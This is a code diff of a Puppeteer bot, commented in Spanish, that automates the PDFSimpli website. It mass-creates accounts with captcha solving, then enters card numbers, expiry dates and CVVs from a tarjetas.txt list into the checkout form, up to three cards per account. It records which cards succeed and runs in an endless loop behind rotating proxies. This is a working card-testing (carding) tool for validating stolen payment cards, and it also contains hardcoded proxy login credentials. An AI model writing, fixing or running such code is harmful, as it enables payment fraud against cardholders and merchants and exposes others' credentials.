+        for (let intento = 1; intento <= 10; intento++) {
+            passInput = await this.deepFind("#password");
+            if (!passInput) {
+                await this.log("⚠️ Campo password desapareció — reintentando...");
+                await this.delay(300);
+                continue;
+            }
+
+            await passInput.click({ clickCount: 3 });
+            await passInput.type(pass, { delay: 30 });
+
+            await this.delay(350);
+
+            const typed = await passInput.evaluate(el => el.value || "");
+            if (typed === pass) {
+                await this.log("🟢 Contraseña quedó escrita correctamente (modo estable)");
+                break;
+            }
+
+            await this.log(`⚠️ Página borró la contraseña → retry (${intento}/10)`);
+        }
+
+        await this.log("🔍 Buscando botón SIGN UP...");
+        let btn = null;
+
+        for (let i = 0; i < 40; i++) {
+            btn = await this.deepFind("#sign-up");
+            if (btn) break;
+            await this.delay(200);
+        }
+
+        if (btn) {
+            const box = await btn.boundingBox();
+            if (box) {
+                await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
+                await this.delay(50);
+                await this.page.mouse.down();
+                await this.delay(50);
+                await this.page.mouse.up();
+            } else {
+                await btn.click();
+            }
+        }
+
+        await this.log("⏳ CAPTCHA...");
+        await this.delay(4000);
+
+        const solver = new CaptchaSolver(this.page, this.log.bind(this));
+        await solver.solve();
+
+        await this.log(`🟢 Cuenta creada: ${email}`);
+        await this.delay(1500);
+    }
     // =============================================================
     // BOTÓN CONTINUE
     // =============================================================
@@ -864,247 +829,239 @@ async clickDownload() {
     }
 
     async waitAndClickContinueToPayment() {
-    await this.log("🔍 Buscando botón CONTINUE (plan)...");
+        await this.log("🔍 Buscando botón CONTINUE (plan)...");
 
-    let btn = null;
+        let btn = null;
 
-    // 🔥 AHORA: 80 INTENTOS ESTABLES
-    for (let i = 0; i < 80; i++) {
-        btn = await this.safeFindContinueButton();
+        for (let i = 0; i < 80; i++) {
+            btn = await this.safeFindContinueButton();
 
-        if (btn) {
+            if (btn) {
+                try {
+                    const box = await btn.boundingBox();
+                    if (box && box.width > 0 && box.height > 0) break;
+                } catch (_) {}
+            }
+
+            if (i % 10 === 0)
+                await this.log(`⏳ CONTINUE aún cargando... (${i}/80)`);
+
+            await this.delay(600);
+        }
+
+        if (!btn)
+            throw new Error("❌ CONTINUE no apareció después de 80 intentos");
+
+        try {
+            await this.page.evaluate(el =>
+                el.scrollIntoView({ behavior: "instant", block: "center" })
+            , btn);
+        } catch (_) {}
+
+        const box = await btn.boundingBox();
+        if (box) {
+            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
+            await this.delay(120);
+            await this.page.mouse.down();
+            await this.delay(80);
+            await this.page.mouse.up();
+        } else {
+            await btn.click();
+        }
+
+        await this.delay(2500);
+        await this.log("🟢 CONTINUE detectado y presionado correctamente (80 intentos modo estable)");
+    }
+
+    // =============================================================
+    // ESPERAR CHECKOUT
+    // =============================================================
+    async waitForCheckoutPage() {
+        await this.log("🔎 Esperando que cargue Checkout...");
+
+        for (let i = 0; i < 40; i++) {
+            const url = this.page.url();
+
+            if (url.includes("/checkout")) {
+                await this.log("🟢 Checkout detectado");
+                return true;
+            }
+
+            await this.delay(500);
+        }
+
+        throw new Error("❌ Checkout no cargó después de 40 intentos");
+    }
+
+    // =============================================================
+    // FORMULARIO COMPLETO — VERSIÓN CLÁSICA (FUNCIONAL)
+    // =============================================================
+    async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
+        await this.waitForCheckoutPage();
+
+        await this.log("🧾 Llenando formulario COMPLETO (versión clásica estable)...");
+
+        // ===============================
+        // NOMBRE TITULAR
+        // ===============================
+        const nombreField =
+            await this.deepFind("#checkout_form_card_name") ||
+            await this.deepFind("[name='cardName']");
+
+        if (!nombreField) throw new Error("❌ Campo NOMBRE no encontrado");
+
+        await nombreField.click({ clickCount: 3 });
+        await nombreField.type(nombre, { delay: 20 });
+
+        // ===============================
+        // MES
+        // ===============================
+        const mesOk = await this.page.evaluate((mesStr) => {
+            const s = document.querySelector("select[name='ccMonthExp'], #expmo");
+            if (!s) return false;
+            const v = String(parseInt(mesStr, 10));
+            if (!v || v === "NaN") return false;
+
+            s.value = v;
+            ["input", "change", "blur"].forEach(ev =>
+                s.dispatchEvent(new Event(ev, { bubbles: true }))
+            );
+
+            return true;
+        }, mes);
+
+        if (!mesOk) throw new Error("❌ No se pudo seleccionar el MES");
+
+        await this.delay(1000);
+
+        // ===============================
+        // AÑO
+        // ===============================
+        const anioOk = await this.page.evaluate((anioStr) => {
+            const s = document.querySelector("select[name='ccYearExp'], #expyr");
+            if (!s) return false;
+            const v = String(parseInt(anioStr, 10));
+            if (!v || v === "NaN") return false;
+
+            s.value = v;
+            ["input", "change", "blur"].forEach(ev =>
+                s.dispatchEvent(new Event(ev, { bubbles: true }))
+            );
+
+            return true;
+        }, anio);
+
+        if (!anioOk) throw new Error("❌ No se pudo seleccionar el AÑO");
+
+        await this.delay(1200);
+
+        // =============================================================
+        // 🔥 FIX: CAMPO DE TARJETA — VERSIÓN ANTIGUA (LA QUE SÍ FUNCIONA)
+        // =============================================================
+        await this.log("🔍 Buscando campo de tarjeta (versión clásica)...");
+
+        let cedulaField = null;
+
+        for (const f of this.page.frames()) {
             try {
-                const box = await btn.boundingBox();
-                if (box && box.width > 0 && box.height > 0) break; // Render REAL
+                const cand = await f.$("input[name='cardNumber'], input#data, input[autocomplete='cc-number']");
+
+                if (!cand) continue;
+
+                const maxLen = await cand.evaluate(el =>
+                    el.getAttribute("maxlength") || ""
+                );
+
+                if (maxLen && parseInt(maxLen, 10) >= 16) {
+                    cedulaField = cand;
+                    break;
+                }
+
             } catch (_) {}
         }
 
-        if (i % 10 === 0)
-            await this.log(`⏳ CONTINUE aún cargando... (${i}/80)`);
-
-        await this.delay(600);  // Búsqueda suave y estable
-    }
-
-    if (!btn)
-        throw new Error("❌ CONTINUE no apareció después de 80 intentos");
-
-    // Scroll estable
-    try {
-        await this.page.evaluate(el =>
-            el.scrollIntoView({ behavior: "instant", block: "center" })
-        , btn);
-    } catch (_) {}
-
-    // Click sólido al centro del botón
-    const box = await btn.boundingBox();
-    if (box) {
-        await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
-        await this.delay(120);
-        await this.page.mouse.down();
-        await this.delay(80);
-        await this.page.mouse.up();
-    } else {
-        await btn.click();
-    }
-
-    await this.delay(2500);
-    await this.log("🟢 CONTINUE detectado y presionado correctamente (80 intentos modo estable)");
-}
-
-// =============================================================
-// VERIFICAR QUE ESTAMOS EN CHECKOUT (VERSIÓN ESTABLE)
-// =============================================================
-async waitForCheckoutPage() {
-    await this.log("🔎 Esperando que cargue Checkout...");
-
-    for (let i = 0; i < 40; i++) {
-        const url = this.page.url();
-
-        if (url.includes("/checkout")) {
-            await this.log("🟢 Checkout detectado");
-            return true;
+        if (!cedulaField) {
+            throw new Error("❌ Campo número de tarjeta NO encontrado (versión clásica)");
         }
-
-        await this.delay(500);
-    }
-
-    throw new Error("❌ Checkout no cargó después de 40 intentos");
-}
-
-
-    // =============================================================
-    // FORMULARIO COMPLETO
-    // =============================================================
-    // =============================================================
-// FORMULARIO COMPLETO — VERSIÓN ULTRA ESTABLE
-// =============================================================
-async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
-    await this.waitForCheckoutPage();
-
-    await this.log("🧾 Llenando formulario COMPLETO (versión estable)...");
-
-    // ===============================
-    // NOMBRE TITULAR
-    // ===============================
-    const nombreField =
-        await this.deepFind("#checkout_form_card_name") ||
-        await this.deepFind("[name='cardName']");
-
-    if (!nombreField) throw new Error("❌ Campo NOMBRE no encontrado");
-
-    await nombreField.click({ clickCount: 3 });
-    await nombreField.type(nombre, { delay: 20 });
-
-    // ===============================
-    // MES (selector)
-    // ===============================
-    const mesOk = await this.page.evaluate((mesStr) => {
-        const s = document.querySelector("select[name='ccMonthExp'], #expmo");
-        if (!s) return false;
-        const v = String(parseInt(mesStr, 10));
-        if (!v || v === "NaN") return false;
-
-        s.value = v;
-        ["input", "change", "blur"].forEach(ev =>
-            s.dispatchEvent(new Event(ev, { bubbles: true }))
-        );
-
-        return true;
-    }, mes);
-
-    if (!mesOk) throw new Error("❌ No se pudo seleccionar el MES");
-
-    await this.delay(1200);
-
-    // ===============================
-    // AÑO (selector)
-    // ===============================
-    const anioOk = await this.page.evaluate((anioStr) => {
-        const s = document.querySelector("select[name='ccYearExp'], #expyr");
-        if (!s) return false;
-        const v = String(parseInt(anioStr, 10));
-        if (!v || v === "NaN") return false;
-
-        s.value = v;
-        ["input", "change", "blur"].forEach(ev =>
-            s.dispatchEvent(new Event(ev, { bubbles: true }))
-        );
-
-        return true;
-    }, anio);
-
-    if (!anioOk) throw new Error("❌ No se pudo seleccionar el AÑO");
-
-    await this.delay(1500);
-
-    // =======================================================
-    // IFRAME ESTABLE ANTES DE ESCRIBIR TARJETA (ANTI RE-RENDER)
-    // =======================================================
-    const frame = await this.waitForCardIframeStable();
-
-    let cedulaField =
-    await frame.$("input[name='card-number']") ||
-    await frame.$("input[autocomplete='cc-number']") ||
-    await frame.$("input[inputmode='numeric']") ||
-    await frame.$("input[maxlength='19']");
-
-    if (!cedulaField)
-    throw new Error("❌ Campo número de tarjeta no encontrado (nueva versión)");
-
-
-    // ===============================
-    // NÚMERO DE TARJETA
-    // ===============================
-    await cedulaField.click({ clickCount: 3 });
-    await cedulaField.type(cedula, { delay: 18 });
-
-    await this.delay(500);
-
-    // ANTI-BORRADO
-    let written = await cedulaField.evaluate(el => el.value || "");
-    if (!written || written.length < 4) {
-        await this.log("⚠️ Número de tarjeta fue borrado → Reintentando con iframe nuevo...");
-
-        const frame2 = await this.waitForCardIframeStable();
-        cedulaField = await frame2.$("input[name='cardNumber'], input#data");
-
-        if (!cedulaField) throw new Error("❌ No se encontró campo número (2da pasada)");
 
         await cedulaField.click({ clickCount: 3 });
-        await cedulaField.type(cedula, { delay: 18 });
+        await cedulaField.type(cedula, { delay: 15 });
 
-        await this.delay(500);
-    }
+        await this.delay(600);
 
-    // ===============================
-    // RUC / CVV4
-    // ===============================
-    let rucField = null;
-    const frames = this.page.frames();
+        // =============================================================
+        // RUC / CVV
+        // =============================================================
+        let rucField = null;
 
-    for (const f of frames) {
-        const cand =
-    await f.$("input[name='cvv']") ||
-    await f.$("input[maxlength='4']") ||
-    await f.$("input[autocomplete='cc-csc']");
+        for (const f of this.page.frames()) {
+            try {
+                const cand =
+                    await f.$("input[name='cvv']") ||
+                    await f.$("input[maxlength='4']") ||
+                    await f.$("input[autocomplete='cc-csc']");
 
-        if (!cand) continue;
+                if (!cand) continue;
 
-        const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
-        if (maxLen === "4") {
-            rucField = cand;
-            break;
+                const maxLen = await cand.evaluate(el =>
+                    el.getAttribute("maxlength") || ""
+                );
+
+                if (maxLen === "4") {
+                    rucField = cand;
+                    break;
+                }
+
+            } catch (_) {}
         }
-    }
 
-    if (!rucField) throw new Error("❌ Campo RUC no encontrado");
+        if (!rucField)
+            throw new Error("❌ Campo RUC/CVV no encontrado");
 
-    await rucField.click({ clickCount: 3 });
-    await rucField.type(ruc, { delay: 20 });
+        await rucField.click({ clickCount: 3 });
+        await rucField.type(ruc, { delay: 20 });
 
-    // ===============================
-    // CHECKBOX TÉRMINOS
-    // ===============================
-    let checkbox = await this.deepFind("#acceptCheckboxMark");
-    if (!checkbox) throw new Error("❌ Checkbox de aceptación no encontrado");
+        // =============================================================
+        // CHECKBOX
+        // =============================================================
+        let checkbox = await this.deepFind("#acceptCheckboxMark");
+        if (!checkbox) throw new Error("❌ Checkbox de aceptación no encontrado");
 
-    await this.page.evaluate(el => el.click(), checkbox);
+        await this.page.evaluate(el => el.click(), checkbox);
 
-    // ===============================
-    // SUBMIT
-    // ===============================
-    let submit = await this.deepFind("#btnChargeebeeSubmit");
-    if (!submit) throw new Error("❌ Botón SUBMIT no encontrado");
+        // =============================================================
+        // SUBMIT
+        // =============================================================
+        let submit = await this.deepFind("#btnChargeebeeSubmit");
+        if (!submit) throw new Error("❌ Botón SUBMIT no encontrado");
 
-    await this.page.evaluate(
-        el => el.scrollIntoView({ behavior: "instant" }),
-        submit
-    );
+        await this.page.evaluate(
+            el => el.scrollIntoView({ behavior: "instant" }),
+            submit
+        );
 
-    await this.delay(300);
+        await this.delay(300);
 
-    try {
-        const box = await submit.boundingBox();
-        if (box) {
-            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
-            await this.delay(70);
-            await this.page.mouse.down();
-            await this.delay(60);
-            await this.page.mouse.up();
-        } else {
+        try {
+            const box = await submit.boundingBox();
+            if (box) {
+                await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
+                await this.delay(70);
+                await this.page.mouse.down();
+                await this.delay(60);
+                await this.page.mouse.up();
+            } else {
+                await submit.click();
+            }
+        } catch (_) {
             await submit.click();
         }
-    } catch (_) {
-        await submit.click();
+
+        await this.log("🚀 Pago enviado (Formulario Completo — Versión Clásica)");
+        await this.delay(1500);
     }
-
-    await this.log("🚀 Pago enviado (Formulario Completo Estable)");
-    await this.delay(1500);
-}
-
-
     // =============================================================
-    // FLUJO RÁPIDO
+    // FLUJO RÁPIDO (solo número de tarjeta + RUC)
     // =============================================================
     async fillCardFast(cedula, ruc) {
         await this.waitForCheckoutPage();
@@ -1113,57 +1070,58 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
 
         let cedulaField = null;
 
-        // 🔥 HASTA 3 INTENTOS PARA ENCONTRAR EL CAMPO
         for (let intento = 1; intento <= 3; intento++) {
-            const frames = this.page.frames(); let cedulaField = null;
+            const frames = this.page.frames();
 
             for (const f of frames) {
                 try {
-                    const cand = await f.$("input[name='cardNumber'], input#data");
+                    const cand = await f.$("input[name='cardNumber'], input#data, input[autocomplete='cc-number']");
                     if (!cand) continue;
 
                     const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
-                    
+
                     if (maxLen && parseInt(maxLen, 10) >= 16) {
                         cedulaField = cand;
                         break;
                     }
+
                 } catch (_) {}
             }
 
             if (cedulaField) break;
 
             await this.log(`⚠️ No se encontró campo de número (rápido) — reintento ${intento}/3`);
-            await this.delay(1500); // Delay humano antes de volver a buscar
+            await this.delay(1500);
         }
 
-        // ❌ Después de 3 intentos aún no existe
-        if (!cedulaField) {
+        if (!cedulaField)
             throw new Error("❌ No se encontró campo de número (rápido) después de 3 intentos");
-        }
 
-        // ✔ Campo encontrado → continuar flujo
         await cedulaField.click({ clickCount: 3 });
         await cedulaField.type(cedula);
 
-        // ============================================
-        // RUC — Igual estable que arriba
-        // ============================================
+        // ====== RUC ======
         let rucField = null;
 
         for (let intento = 1; intento <= 3; intento++) {
-            const frames = this.page.frames(); let cedulaField = null;
+            const frames = this.page.frames();
 
             for (const f of frames) {
                 try {
-                    const cand = await f.$("input#data[name='Data'], input[maxlength='4']");
+                    const cand =
+                        await f.$("input[name='cvv']") ||
+                        await f.$("input[maxlength='4']") ||
+                        await f.$("input[autocomplete='cc-csc']");
+
                     if (!cand) continue;
 
                     const maxLen = await cand.evaluate(el => el.getAttribute("maxlength") || "");
+
                     if (maxLen === "4") {
                         rucField = cand;
                         break;
                     }
+
                 } catch (_) {}
             }
 
@@ -1173,13 +1131,13 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
             await this.delay(1500);
         }
 
-        if (!rucField) {
+        if (!rucField)
             throw new Error("❌ No se encontró campo RUC (rápido) después de 3 intentos");
-        }
 
         await rucField.click({ clickCount: 3 });
         await rucField.type(ruc);
 
+        // ====== SUBMIT ======
         let submit = await this.deepFind("#btnChargeebeeSubmit");
         if (!submit) throw new Error("❌ Botón SUBMIT no encontrado (rápido)");
 
@@ -1187,6 +1145,7 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
             el => el.scrollIntoView({ behavior: "instant" }),
             submit
         );
+
         await submit.click();
 
         await this.log("🚀 Pago enviado (FLUJO RÁPIDO)");
@@ -1194,7 +1153,7 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
     }
 
     // =============================================================
-    // CLOSE KILLER
+    // CLOSE KILLER — DETECTA Y CIERRA MODALES DE ERROR
     // =============================================================
     async findCloseButton() {
         const frames = [this.page, ...this.page.frames()];
@@ -1221,7 +1180,7 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
                     );
                 });
                 if (handle && handle.asElement()) return handle.asElement();
-            } catch (_) { }
+            } catch (_) {}
         }
 
         const selectors = [
@@ -1239,7 +1198,7 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
                         const text = (await b.evaluate(el => el.innerText || "")).trim().toLowerCase();
                         if (text.includes("close")) return b;
                     }
-                } catch (_) { }
+                } catch (_) {}
             }
         }
 
@@ -1271,7 +1230,7 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
                 await this.page.evaluate(el => {
                     el.scrollIntoView({ behavior: "instant", block: "center" });
                 }, btn);
-            } catch (_) { }
+            } catch (_) {}
 
             try {
                 const box = await btn.boundingBox();
@@ -1287,7 +1246,7 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
                 } else {
                     await this.page.evaluate(el => el.click(), btn);
                 }
-            } catch (_) { }
+            } catch (_) {}
 
             await this.delay(1000);
         }
@@ -1307,7 +1266,7 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
                         }
                     });
                 });
-            } catch (_) { }
+            } catch (_) {}
 
             await this.delay(500);
             await this.log("🟢 Modal destruido (Force Mode)");
@@ -1318,7 +1277,7 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
     }
 
     // =============================================================
-    // VERIFICAR RESULTADO PAGO
+    // VERIFICADOR DE RESULTADO DEL PAGO
     // =============================================================
     async verificarResultadoPago(tarjetaActual) {
         const cedulaTxt = tarjetaActual ? tarjetaActual.cedula : "N/A";
@@ -1351,7 +1310,7 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
                         return false;
                     });
                     if (visibleSuccess) success = true;
-                } catch (_) { }
+                } catch (_) {}
             }
 
             if (!success) {
@@ -1396,31 +1355,39 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
         );
         return false;
     }
-
     // =============================================================
-    // PROCESO TARJETA (GUARDAR + BORRAR)
+    // PROCESO TARJETA (guardar, mover, eliminar)
     // =============================================================
     async procesarTarjeta(tarjeta, usarRapido) {
         const { cedula, mes, anio, ruc } = tarjeta;
         const nombre = "User" + Math.random().toString(36).slice(2, 7);
 
-        if (!usarRapido) {
-            await this.fillPaymentForm(cedula, mes, anio, ruc, nombre);
-        } else {
-            await this.fillCardFast(cedula, ruc);
+        try {
+            if (!usarRapido) {
+                await this.fillPaymentForm(cedula, mes, anio, ruc, nombre);
+            } else {
+                await this.fillCardFast(cedula, ruc);
+            }
+
+            const ok = await this.verificarResultadoPago(tarjeta);
+
+            await this.guardarTarjetaEnArchivo(tarjeta, ok);
+            await this.eliminarTarjetaDelArchivo(tarjeta);
+
+            return ok;
+
+        } catch (e) {
+            await this.log("⚠️ Error procesando tarjeta: " + e.message);
+
+            await this.guardarTarjetaEnArchivo(tarjeta, false);
+            await this.eliminarTarjetaDelArchivo(tarjeta);
+
+            return false;
         }
-
-        const ok = await this.verificarResultadoPago(tarjeta);
-
-        await this.guardarTarjetaEnArchivo(tarjeta, ok);
-
-        await this.eliminarTarjetaDelArchivo(tarjeta);
-
-        return ok;
     }
 
     // =============================================================
-    // FLUJO PRINCIPAL DE UNA CUENTA (3 TARJETAS)
+    // FLUJO PRINCIPAL DE UNA CUENTA (SUBE PDF → REGISTRA → PAGA)
     // =============================================================
     async executeFlowCuenta() {
         await this.log("🌐 Cargando PDFSimpli (nueva cuenta)...");
@@ -1431,19 +1398,17 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
 
         await this.delay(1500);
 
-        await this.uploadPDF();
-        await this.clickLetsGetStarted();
-        await this.clickConvert();
-
-        await this.clickDownload();
-
-        await this.handleRegistration();
-
-        await this.waitAndClickContinueToPayment();
+        await this.uploadPDF();              // 1 → subir PDF
+        await this.clickLetsGetStarted();     // 2 → GET STARTED
+        await this.clickConvert();            // 3 → Convert
+        await this.clickDownload();           // 4 → Descargar archivo
+        await this.handleRegistration();      // 5 → Registro + captcha
+        await this.waitAndClickContinueToPayment();  // 6 → Continue → Checkout
 
         this.cardsThisAccount = 0;
 
         while (this.cardsThisAccount < 3) {
+
             const tarjeta = this.getNextTarjeta();
             if (!tarjeta) {
                 await this.log("⛔ No hay más tarjetas en tarjetas.txt");
@@ -1457,34 +1422,24 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
                 `💳 Probando tarjeta #${this.cardsThisAccount} en cuenta (modo: ${usarRapido ? "RÁPIDO" : "COMPLETO"})`
             );
 
-            try {
-                const ok = await this.procesarTarjeta(tarjeta, usarRapido);
+            const ok = await this.procesarTarjeta(tarjeta, usarRapido);
 
-                if (ok) {
-                    await this.log("🏁 CUENTA FINALIZADA POR TARJETA VÁLIDA → CREAR NUEVA CUENTA");
-                    this.cuentasProcesadas++; // 🔥 NUEVO
-                    return true;
-                }
-
-            } catch (e) {
-                await this.log("⚠️ Error procesando tarjeta: " + e.message);
+            if (ok) {
+                await this.log("🏁 CUENTA FINALIZADA POR TARJETA VÁLIDA → CREAR NUEVA CUENTA");
+                this.cuentasProcesadas++;
+                return true;
             }
         }
 
         await this.log("⛔ Las 3 tarjetas de esta cuenta fueron inválidas — se creará una nueva cuenta.");
-        this.cuentasProcesadas++; // 🔥 NUEVO
+        this.cuentasProcesadas++;
         return true;
     }
 
-        async close() {
-        if (this.browser) {
-            await this.browser.close();
-            await this.log("🔚 Navegador cerrado");
-        }
-    }
-
-    // 👇 AQUÍ PEGA restartBrowser (DENTRO DE LA CLASE)
-       async restartBrowser() {
+    // =============================================================
+    // REINICIAR NAVEGADOR POR COMPLETO
+    // =============================================================
+    async restartBrowser() {
         try {
             if (this.page) {
                 try { await this.page.close(); } catch (_) {}
@@ -1516,6 +1471,7 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
 
             this.page = await this.browser.newPage();
 
+            // PROXY OXYLABS LOGIN
             await this.page.authenticate({
                 username: "user-zabuza_Z60hQ",
                 password: "Tuning_9718ZZ"
@@ -1525,22 +1481,50 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
 
         } catch (e) {
             await this.log("❌ Error en restartBrowser: " + e.message);
-            throw e;
         }
     }
-}  // ⬅️ SOLO ESTA LLAVE CIERRA LA CLASE
 
+    // =============================================================
+    // CERRAR TODO
+    // =============================================================
+    async close() {
+        if (this.browser) {
+            try { await this.browser.close(); } catch (_) {}
+            await this.log("🔚 Navegador cerrado");
+        }
+    }
+} // ⬅️ ESTA LLAVE CIERRA LA CLASE PDFSimpliBot COMPLETA
+
+
+// =============================================================
+// 🔥 MAIN LOOP — EJECUCIÓN INFINITA DEL BOT
+// =============================================================
 (async () => {
     const bot = new PDFSimpliBot();
 
+    // ---------------------------------------------------------
+    // 1️⃣ Cargar tarjetas
+    // ---------------------------------------------------------
     await bot.loadAllTarjetas();
+
+    // ---------------------------------------------------------
+    // 2️⃣ Reiniciar navegador ANTES DE INICIAR (super estable)
+    // ---------------------------------------------------------
     await bot.restartBrowser();
 
     try {
         while (true) {
+
             await bot.log(`🧠 INICIANDO CUENTA #${bot.cuentasProcesadas + 1}`);
 
+            // ---------------------------------------------------------
+            // 3️⃣ Limpiar navegador ANTES de cada cuenta
+            // ---------------------------------------------------------
             await bot.limpiarNavegador();
+
+            // ---------------------------------------------------------
+            // 4️⃣ Ejecutar flujo principal completo
+            // ---------------------------------------------------------
             const seguir = await bot.executeFlowCuenta();
 
             if (!seguir) {
@@ -1548,12 +1532,17 @@ async fillPaymentForm(cedula, mes, anio, ruc, nombre) {
                 break;
             }
 
+            // ---------------------------------------------------------
+            // 5️⃣ Reiniciar navegador para siguiente cuenta
+            // ---------------------------------------------------------
             await bot.restartBrowser();
         }
 
     } catch (e) {
         console.error("❌ ERROR GENERAL:", e.message);
+
     } finally {
         await bot.close();
     }
+
 })();
